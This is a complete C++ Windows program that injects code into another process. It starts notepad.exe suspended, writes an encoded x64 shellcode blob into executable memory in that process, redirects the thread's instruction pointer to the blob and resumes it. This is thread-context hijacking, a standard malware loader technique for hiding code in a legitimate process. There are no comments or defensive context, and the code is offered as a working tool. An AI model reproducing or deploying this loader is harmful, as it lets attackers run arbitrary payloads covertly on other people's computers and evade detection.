#pragma warning (disable:4996)

#include <iostream>
#include<Windows.h>

using namespace std;


#define TARGET_PROC "notepad.exe"

unsigned char buf[] =
"\x48\x31\xc9\x48\x81\xe9\xdd\xff\xff\xff\x48\x8d\x05\xef"
"\xff\xff\xff\x48\xbb\x4e\x29\xad\xb7\xac\xf9\x9a\x8f\x48"
"\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\xb2\x61\x2e"
"\x53\x5c\x11\x5a\x8f\x4e\x29\xec\xe6\xed\xa9\xc8\xde\x18"
"\x61\x9c\x65\xc9\xb1\x11\xdd\x2e\x61\x26\xe5\xb4\xb1\x11"
"\xdd\x6e\x61\x26\xc5\xfc\xb1\x95\x38\x04\x63\xe0\x86\x65"
"\xb1\xab\x4f\xe2\x15\xcc\xcb\xae\xd5\xba\xce\x8f\xe0\xa0"
"\xf6\xad\x38\x78\x62\x1c\x68\xfc\xff\x27\xab\xba\x04\x0c"
"\x15\xe5\xb6\x7c\x72\x1a\x07\x4e\x29\xad\xff\x29\x39\xee"
"\xe8\x06\x28\x7d\xe7\x27\xb1\x82\xcb\xc5\x69\x8d\xfe\xad"
"\x29\x79\xd9\x06\xd6\x64\xf6\x27\xcd\x12\xc7\x4f\xff\xe0"
"\x86\x65\xb1\xab\x4f\xe2\x68\x6c\x7e\xa1\xb8\x9b\x4e\x76"
"\xc9\xd8\x46\xe0\xfa\xd6\xab\x46\x6c\x94\x66\xd9\x21\xc2"
"\xcb\xc5\x69\x89\xfe\xad\x29\xfc\xce\xc5\x25\xe5\xf3\x27"
"\xb9\x86\xc6\x4f\xf9\xec\x3c\xa8\x71\xd2\x8e\x9e\x68\xf5"
"\xf6\xf4\xa7\xc3\xd5\x0f\x71\xec\xee\xed\xa3\xd2\x0c\xa2"
"\x09\xec\xe5\x53\x19\xc2\xce\x17\x73\xe5\x3c\xbe\x10\xcd"
"\x70\xb1\xd6\xf0\xff\x16\xf8\x9a\x8f\x4e\x29\xad\xb7\xac"
"\xb1\x17\x02\x4f\x28\xad\xb7\xed\x43\xab\x04\x21\xae\x52"
"\x62\x17\x09\x2f\x2d\x18\x68\x17\x11\x39\x44\x07\x70\x9b"
"\x61\x2e\x73\x84\xc5\x9c\xf3\x44\xa9\x56\x57\xd9\xfc\x21"
"\xc8\x5d\x5b\xc2\xdd\xac\xa0\xdb\x06\x94\xd6\x78\xd4\xcd"
"\x95\xf9\xa1\x2b\x51\xc8\xb7\xac\xf9\x9a\x8f";

BOOL CreateSuspendProc(IN CHAR* name, OUT DWORD* id, OUT HANDLE* hid, OUT HANDLE* ht) {
    wchar_t windir[MAX_PATH];
    char lpPath[MAX_PATH * 2];

    STARTUPINFOA si{ 0 };
    PROCESS_INFORMATION pi{ 0 };

    RtlSecureZeroMemory(&si, sizeof(STARTUPINFO));
    RtlSecureZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
    si.cb = sizeof(STARTUPINFO);

    if (!GetEnvironmentVariable(L"WINDIR", windir, MAX_PATH)) {
        std::wcout << L"[!] Can't get environment variable\n";
        return FALSE;
    }

    sprintf(lpPath, "%ls\\System32\\%s", windir, name);
    std::wcout << L"Launching process: " << lpPath << L"\n";

    if (!CreateProcessA(NULL, lpPath, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        std::wcout << L"[!] Can't create process. Error code: " << GetLastError() << L"\n";
        return FALSE;
    }

    *ht = pi.hThread;
    *id = pi.dwProcessId;
    *hid = pi.hProcess;

    std::wcout << L"[*] Process created successfully.\n";
    return TRUE;
}
BOOL injection(IN HANDLE hproc, IN PBYTE pshellcode, IN size_t sizeshellcode, OUT PVOID* addr) {

	*addr = VirtualAllocEx(hproc, 0, sizeof(pshellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	
	WriteProcessMemory(hproc, *addr, pshellcode, sizeshellcode, 0);

	return true;

}



int main()
{
	char name[] = TARGET_PROC;
	DWORD pid{ 0 };
	HANDLE hthread{ 0 };
	HANDLE hproc{0};
	CreateSuspendProc(name, &pid,&hproc, &hthread);
	PVOID remote_addr = NULL;
	injection(hproc, buf, sizeof(buf), &remote_addr);

	CONTEXT context{};
	context.ContextFlags = CONTEXT_ALL;
	GetThreadContext(hthread, &context);

	context.Rip = (DWORD64)remote_addr;

	SetThreadContext(hthread, &context);
    getchar();
	ResumeThread(hthread);
	WaitForSingleObject(hthread, INFINITE);

	return 0;

}
